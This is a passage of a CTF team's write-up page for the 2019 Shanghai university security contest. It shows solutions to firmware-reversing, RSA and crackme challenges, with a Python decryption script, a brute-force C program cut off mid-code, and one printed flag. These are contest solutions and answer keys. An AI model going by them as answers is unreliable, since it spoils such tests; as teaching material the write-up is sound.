<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>2019 上海市大学生网络安全大赛 | r00t信息安全战队</title>
    <meta name="generator" content="VuePress 1.9.9">
    
    <meta name="description" content="分享 | 求知 | 提升">
    
    <link rel="preload" href="/assets/css/0.styles.e8e4f3a3.css" as="style"><link rel="preload" href="/assets/js/app.1eac7796.js" as="script"><link rel="preload" href="/assets/js/2.da4aa226.js" as="script"><link rel="preload" href="/assets/js/10.6818eed9.js" as="script"><link rel="prefetch" href="/assets/js/11.c5844bad.js"><link rel="prefetch" href="/assets/js/12.54862c7d.js"><link rel="prefetch" href="/assets/js/13.dd8c8750.js"><link rel="prefetch" href="/assets/js/14.617bb0c2.js"><link rel="prefetch" href="/assets/js/15.f27cce8c.js"><link rel="prefetch" href="/assets/js/16.979d9069.js"><link rel="prefetch" href="/assets/js/17.97839523.js"><link rel="prefetch" href="/assets/js/18.55f9e085.js"><link rel="prefetch" href="/assets/js/19.0b3f3b95.js"><link rel="prefetch" href="/assets/js/20.23bc5ab1.js"><link rel="prefetch" href="/assets/js/21.af5f5ba5.js"><link rel="prefetch" href="/assets/js/22.f640f616.js"><link rel="prefetch" href="/assets/js/23.f69547ef.js"><link rel="prefetch" href="/assets/js/24.6e00637a.js"><link rel="prefetch" href="/assets/js/25.6fb26861.js"><link rel="prefetch" href="/assets/js/26.c2d2abef.js"><link rel="prefetch" href="/assets/js/27.cb617287.js"><link rel="prefetch" href="/assets/js/28.639cddd1.js"><link rel="prefetch" href="/assets/js/29.1c62d8ae.js"><link rel="prefetch" href="/assets/js/3.0f769c09.js"><link rel="prefetch" href="/assets/js/30.7cbff6e2.js"><link rel="prefetch" href="/assets/js/31.6a66925e.js"><link rel="prefetch" href="/assets/js/32.d8004455.js"><link rel="prefetch" href="/assets/js/33.8ec69a13.js"><link rel="prefetch" href="/assets/js/34.4a42a1bd.js"><link rel="prefetch" href="/assets/js/4.ddc6d2f6.js"><link rel="prefetch" href="/assets/js/5.175964b3.js"><link rel="prefetch" href="/assets/js/6.da13883d.js"><link rel="prefetch" href="/assets/js/7.0de84f15.js"><link rel="prefetch" href="/assets/js/8.c6432f97.js"><link rel="prefetch" href="/assets/js/9.72c27c98.js">
    <link rel="stylesheet" href="/assets/css/0.styles.e8e4f3a3.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">r00t信息安全战队</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/finance.html" class="nav-link">
  财务公开
</a></div><div class="nav-item"><a href="/kb/" class="nav-link">
  知识库
</a></div><div class="nav-item"><a href="/writeup/" class="nav-link router-link-active">
  WriteUp
</a></div><div class="nav-item"><a href="/wiki/" class="nav-link">
  原 Wiki
</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/finance.html" class="nav-link">
  财务公开
</a></div><div class="nav-item"><a href="/kb/" class="nav-link">
  知识库
</a></div><div class="nav-item"><a href="/writeup/" class="nav-link router-link-active">
  WriteUp
</a></div><div class="nav-item"><a href="/wiki/" class="nav-link">
  原 Wiki
</a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span>2019 上海市大学生网络安全大赛</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/writeup/2019-sh.html#签到" class="sidebar-link">签到</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-sh.html#hardware" class="sidebar-link">Hardware</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-sh.html#rsa" class="sidebar-link">rsa</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-sh.html#poly" class="sidebar-link">poly</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-sh.html#puzzle" class="sidebar-link">Puzzle</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-sh.html#touch-of-satan" class="sidebar-link">Touch of Satan</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-sh.html#decade" class="sidebar-link">decade</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-sh.html#babyt5" class="sidebar-link">babyt5</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-sh.html#easysql" class="sidebar-link">easysql</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-sh.html#unlimited-base64-works" class="sidebar-link">Unlimited Base64 Works</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-sh.html#无线安全" class="sidebar-link">无线安全</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-sh.html#诚聘pwn师傅" class="sidebar-link">诚聘PWN师傅</a><ul class="sidebar-sub-headers"></ul></li></ul></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="_2019-上海市大学生网络安全大赛"><a href="#_2019-上海市大学生网络安全大赛" class="header-anchor">#</a> 2019 上海市大学生网络安全大赛</h1> <p>没人做 pwn 吃大亏</p> <h2 id="签到"><a href="#签到" class="header-anchor">#</a> 签到</h2> <p>题目提示登陆失败…，所以要求注册的时候直接点提交，出现一个失败的提示对话框，IDA 打开 010editor.exe 搜索对应字符串，然后在查找引用，同一个函数中包含了本题的 flag，文件实在太大，复现的时候就干脆 010editor 搜索字符串然后上下翻翻找 flag 了。
<img src="/assets/img/2019-sh-1.ba8a4c7d.png" alt="1"></p> <h2 id="hardware"><a href="#hardware" class="header-anchor">#</a> Hardware</h2> <p>拿到的是一张Arduino UNO的接线图和一份Intel HEX格式的固件。使用Arduino IDE自带的avr-binutils工具包，可以将固件转换为二进制文件，便于分析：</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>avr-objcopy <span class="token parameter variable">-I</span> ihex <span class="token parameter variable">-O</span> binary 7seg.ino.hex 7seg.ino.bin
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>使用IDA加载生成的二进制文件（因为Arduino UNO的处理器ATmega328P不在IDA的支持范围内，故处理器选择最接近的ATmega168P）。</p> <p>由入口__RESET定位到一个死循环的函数sub_2EC（对应Arduino源码的void loop()），发现循环体在不断重复一个固定的操作：</p> <div class="language-asm6502 line-numbers-mode"><pre class="language-asm6502"><code>ldi r22<span class="token punctuation">,</span> {<span class="token decimal-number number">0</span>|<span class="token decimal-number number">1</span>}<span class="token comment">;</span>
ldi r24<span class="token punctuation">,</span> {<span class="token decimal-number number">0</span>..<span class="token decimal-number number">6</span>}<span class="token comment">;</span>
call sub_70
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>结合电路图中Arduino上恰好D0~D6外接至了7位数码管，可知这些操作就是在改变每段数码管的亮灭。按顺序和中间不时出现的“刷新”函数sub_E2，还原出每一位显示的字符，即为flag。</p> <h2 id="rsa"><a href="#rsa" class="header-anchor">#</a> rsa</h2> <p>告诉了pq和(p+1)/p+(q+1)/q，根据高中的代数知识可以求出 q+p 进而拿到(p-1)*(q-1)==qp-(p+q)+1 然后根据原文是 123 的这一组 爆破 e 的值，得到 e 是 251，然后用 gmpy2 求密钥解得 flag 的 hex</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> gmpy2
n <span class="token operator">=</span> <span class="token number">9538795663851271297602738029671089878718012242935213096566250130325046936720540247534143498025477544161347330379679111765871420732255741210434736423951962189227302658997497664520929375215715960063615792480965807127438948044298348300153102760490410578638259665656608784635088735809470916136628779400145983632930861883762707606629208260803446083579674497451514650309351925430391515629898218875049677870989016071086844819626778388370764400242376469343158294638240660190754978627356076115228410162956087266527271225439142347304100660800517276772407728290414074912243665126741030948775883739544952378188264714716087909797</span>
<span class="token comment">#2*p*q+q+p=m</span>
m <span class="token operator">=</span> <span class="token number">19077591327702542595205476059342179757436024485870426193132500260650093873441080495068286996050955088322694660759358223531742841464511482420869472847903924378454605317994995329041858750431431920127231584961931614254877896088596696600306205520980821157276519331313217569270177471618941832273257558800291967266057799408185825199394392306374394195697993019961311696247374832761757990150416392201444079060627610573918631913438062954960835929982836033906925917632413007648356037059843552967726871763559759125837289869091638924336309932526582201350695938677991368335828814565265478203873169858685929462350511138398905572292</span>
<span class="token comment"># p+q=k</span>
k <span class="token operator">=</span> m <span class="token operator">-</span> n <span class="token operator">*</span> <span class="token number">2</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span>
<span class="token comment"># r=(p-1)*(q-1) = p*q-(q+p)-1=n-k+1</span>
r <span class="token operator">=</span> n <span class="token operator">-</span> k <span class="token operator">+</span> <span class="token number">1</span>
p <span class="token operator">=</span> <span class="token number">368284101618076523549199130884422355928051525996327977632544904437878504262870825378516827225793010165434494157238379685995430409966951122729243411694569562164062815098110639750101378457641471316188502263725098231679401928494160942213175404259256770984218593245458108598930926260386443799301699336309331946341173652201791293571029025818674575198311845811957606474490230382511996537893448524426809391980637983473305318819523408854264623254226127223862150173575206444726570183096891630129244778802793476295746913846105454198627</span>
e <span class="token operator">=</span> <span class="token number">251</span>
d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>r<span class="token punctuation">)</span>
c <span class="token operator">=</span> <span class="token number">7303495910407762399046490836902121070389476875516762048462433039234972742941586801378979220008051262826174054961747648114128456872349675769941760630519744351742977740846748646739901172672743584989842268056810152117350241337045055812845489372389014195433916347255846499434232234822333192328886207187844781726928951986353054876826105507064928478812402103648940709131760865763234071703554208057808885564381400571862422316195578258814602362582573148358552148686182480215663291366798585241933446701357953551496955627421526567152576426417189707335038601040167826900549139608192971559659991213411381604721734898065256138516</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><h2 id="poly"><a href="#poly" class="header-anchor">#</a> poly</h2> <p>不知道是题出炸了还是故意的，对比了一下输出文件，发现明文根本没有被加密，只是在前面加了4个零。所以将最后两行拼在一起，得到字符串：<code>Good!This_is_flag:flag{6069caf6-09e1-494a-bcb5-b94e8f288971}</code></p> <h2 id="puzzle"><a href="#puzzle" class="header-anchor">#</a> Puzzle</h2> <p><img src="/assets/img/2019-sh-2.2992ded6.png" alt="2">
查看题目逻辑，初始化、输入一个串（sub_40ED00怀疑scanf）然后一连串函数调用，第一个检查flag格式（有坑，检测的格式只有[a-f]，而求出的输入串不只包含字母）第二个将连续两字符读入为一字节，后面的函数就只用了v9串，第三个函数与输入没关系暂且跳过，算是初始化了map这个 ，第四个函数用map来异或改变输入串的值，但被异或的值实际上与输入无关，动调提取出异或的数组{0x7c, 0xab, 0x2d, 0x91, 0x2f, 0x98, 0xed, 0xa9}，第五个函数根据8个0到9之间的数值对一个全局变量数组进行了若干操作，因为输入只有10的8次方种可能，同时进行的只是算数运算，所以可以爆破（应该也只能爆破吧我猜的）</p> <p>八层循环，然后循环中直接复制IDA生成的C代码来跑，很快算出唯一一组能通过第五个函数检查的，与前面的异或数组异或，然后patch掉第一个函数的检测，得到flag</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token keyword">int</span> dword_40F020<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> bk<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0x8A</span><span class="token punctuation">,</span> <span class="token number">0x1A1</span><span class="token punctuation">,</span> <span class="token number">0x12A</span><span class="token punctuation">,</span> <span class="token number">0x269</span><span class="token punctuation">,</span> <span class="token number">0x209</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x39F</span><span class="token punctuation">,</span> <span class="token number">0x2C8</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> ans<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0xFFFFFC49</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0xFFFFCC30</span><span class="token punctuation">,</span> <span class="token number">0x3A71</span><span class="token punctuation">,</span> <span class="token number">0x3878</span><span class="token punctuation">,</span> <span class="token number">0xE7</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFF11</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> i<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> f<span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">)</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">)</span>
                <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">)</span>
                    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">)</span>
                        <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">)</span>
                            <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">)</span>
                                <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">)</span>
                                <span class="token punctuation">{</span>
                                    f <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
                                    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">)</span> dword_40F020<span class="token punctuation">[</span>i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> bk<span class="token punctuation">[</span>i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                                    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">)</span>
                                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">change</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span>i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                                            f <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
                                            <span class="token keyword">break</span><span class="token punctuation">;</span>
                                        <span class="token punctuation">}</span>
                                    <span class="token keyword">if</span> <span class="token punctuation">(</span>f <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>
                                    f <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
                                    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">)</span>
                                        <span class="token keyword">if</span> <span class="token punctuation">(</span>dword_40F020<span class="token punctuation">[</span>i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">!=</span> ans<span class="token punctuation">[</span>i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                                            f <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
                                            <span class="token keyword">break</span><span class="token punctuation">;</span>
                                        <span class="token punctuation">}</span>
                                    <span class="token keyword">if</span> <span class="token punctuation">(</span>f <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>
                                    <span class="token keyword">else</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;flag -&gt; [%d, %d, %d, %d, %d, %d, %d, %d]\n&quot;</span><span class="token punctuation">,</span> i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
    <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>
        dword_40F020<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&amp;=</span> dword_40F020<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        dword_40F020<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">*=</span> dword_40F020<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>dword_40F020<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
        dword_40F020<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">/=</span> dword_40F020<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        dword_40F020<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+=</span> dword_40F020<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>
        dword_40F020<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">^=</span> dword_40F020<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        dword_40F020<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+=</span> dword_40F020<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>
        dword_40F020<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">-=</span> dword_40F020<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        dword_40F020<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">&amp;=</span> dword_40F020<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>
        dword_40F020<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">*=</span> dword_40F020<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        dword_40F020<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-=</span> dword_40F020<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">5</span><span class="token operator">:</span>
        dword_40F020<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^=</span> dword_40F020<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        dword_40F020<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">-=</span> dword_40F020<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">6</span><span class="token operator">:</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>dword_40F020<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
        dword_40F020<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">|=</span> dword_40F020<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">/</span> dword_40F020<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        dword_40F020<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">/=</span> dword_40F020<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">7</span><span class="token operator">:</span>
        dword_40F020<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+=</span> dword_40F020<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        dword_40F020<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">|=</span> dword_40F020<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">8</span><span class="token operator">:</span>
        dword_40F020<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*=</span> dword_40F020<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        dword_40F020<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">-=</span> dword_40F020<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">9</span><span class="token operator">:</span>
        dword_40F020<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+=</span> dword_40F020<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
